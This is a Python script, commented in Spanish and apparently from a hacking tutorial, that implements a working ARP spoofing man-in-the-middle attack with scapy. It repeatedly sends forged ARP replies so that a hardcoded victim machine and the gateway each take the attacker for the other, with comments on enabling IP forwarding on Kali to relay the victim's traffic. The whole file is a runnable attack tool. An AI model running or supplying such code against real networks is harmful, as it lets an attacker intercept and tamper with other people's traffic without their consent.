import time
import scapy.all as scapy


def get_mac(ip):
    #ARP convierte dinámicamente las direcciones de Internet en las 
    # irecciones de hardware exclusivas de las redes de área local.
    arp_request = scapy.ARP(pdst=ip)   #Se obtienen direcciones ip
    #el broadcast es una conexión multipunto, que permite enviar un paquete de datos 
    # desde un punto a todos los usuarios en una red de mensajes
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')    #Se obtienen direcciones mac
    
    arp_request_broadcast = broadcast / arp_request #se concatenan

    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0] #se obtienen paquetes de las direcciones dadas, [0] indica que se tienen en cuenta solo los paquetes respondidos y no todos
    #la funcion srp pasa por toda la subnet preguntando a cada ip quien tiene dicha ip
    # devuelve dos objetos answered y unanswered

    return answered_list[0][1].hwsrc #[0] pedimos solo una respuesta, [1].hwsrc de la lista de answered pedimos el mac y no la ip 


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    #creamos paquete ARP
    #Para hacerle creer a la maquina destino que somos el router
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)    #op = 1 pregunta, op = 2 respuesta
    #pdst = ip destino, hwdst= mac destino, psrc= puerta de enlace del router

    scapy.send(packet, verbose=False) #enviamos el paquete, verbose=False no muestra por consola el envio

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)


target_ip = "192.168.0.83"
gateway_ip = "192.168.0.1"
sent_paket_count = 0
#se debe habilitar desde kali el ip_forward para darle internet a la victima
#sudo su -->super usuario
#echo 1 > /proc/sys/net/ipv4/ip_forward --> con echo copiamos el "1" en el archivo ip_forward
#el sistema GNU utiliza este archivo como bandera para saber si debe funcionar como enrutador
try:
    while True:
        spoof(gateway_ip, target_ip)    #hacemos creer al router que somos la victima
        spoof(target_ip, gateway_ip)    #hacemos creer a la victima que somos el router

        sent_paket_count += 2
        print("\r[+] Packets sent: " + str(sent_paket_count), end = "") #\r mostramos el mensaje desde el inicio
        #end="" indicamos que no queremos mostrar nada en el final y de esta manera se muestra un print dinamico
        time.sleep(3)
except KeyboardInterrupt:
    print("Finalizando ataque... Limpiando tablas... Cerrando ARP Spoofer")
    restore(target_ip, gateway_ip)